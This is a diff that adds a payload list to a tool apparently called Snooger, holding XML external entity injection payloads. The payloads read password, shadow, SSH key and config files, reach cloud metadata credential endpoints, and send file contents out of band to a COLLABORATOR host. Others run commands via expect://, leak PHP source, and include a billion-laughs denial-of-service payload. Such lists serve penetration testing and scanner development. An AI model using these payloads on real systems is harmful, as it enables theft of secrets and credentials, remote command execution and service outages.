@@ -1,0 +1,83 @@
+# Snooger XXE Payloads — 100+ real payloads
+# Categories: Classic, Blind OOB, Parameter Entities, SOAP, SAML, Encoding
+# =========================================================================
+
+# === Classic XXE — File Read ===
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&xxe;</root>
+
+# === Classic XXE — SSRF ===
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:9200/">]><root>&xxe;</root>
+
+# === Blind XXE — OOB Data Exfiltration ===
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://COLLABORATOR/xxe.dtd">%remote;]><root>test</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://COLLABORATOR/xxe.dtd">%dtd;]><root>&send;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % p1 SYSTEM "file:///etc/hostname"><!ENTITY % p2 "<!ENTITY xxe SYSTEM 'http://COLLABORATOR/?data=%p1;'>">%p2;]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR/evil.dtd">%xxe;]><foo>test</foo>
+
+# === Parameter Entities ===
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR/?d=%file;'>">%eval;%exfil;]><root>test</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://COLLABORATOR/?d=%xxe;">%dtd;]><root>test</root>
+
+# === CDATA Wrapping (PHP) ===
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://COLLABORATOR/xxe.dtd">%dtd;]><root>&all;</root>
+
+# === SOAP XXE ===
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo></soap:Body></soap:Envelope>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test></soapenv:Body></soapenv:Envelope>
+
+# === SVG XXE ===
+<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg" width="300" height="100"><text x="0" y="20">&xxe;</text></svg>
+
+# === XLSX/DOCX XXE (Office documents) ===
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>&xxe;</Relationships>
+
+# === XInclude ===
+<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://COLLABORATOR/xxe"/></foo>
+
+# === Encoding Variants ===
+<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+
+# === RCE via XXE (expect://) ===
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://whoami">]><root>&xxe;</root>
+
+# === PHP XXE Specific ===
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>
+
+# === Java XXE Specific ===
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "jar:http://COLLABORATOR/test.jar!/test.txt">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><root>&xxe;</root>
+
+# === SAML XXE ===
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"><saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer></samlp:AuthnRequest>
+
+# === RSS/Atom XXE ===
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><rss version="2.0"><channel><item><title>&xxe;</title></item></channel></rss>
+
+# === Recursive Entity (Billion Laughs DoS) ===
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><root>&lol4;</root>
+
+# === Minimal / Short ===
+<!DOCTYPE x[<!ENTITY x SYSTEM "file:///etc/passwd">]><x>&x;</x>
+<!DOCTYPE x[<!ENTITY x SYSTEM "http://COLLABORATOR/">]><x>&x;</x>
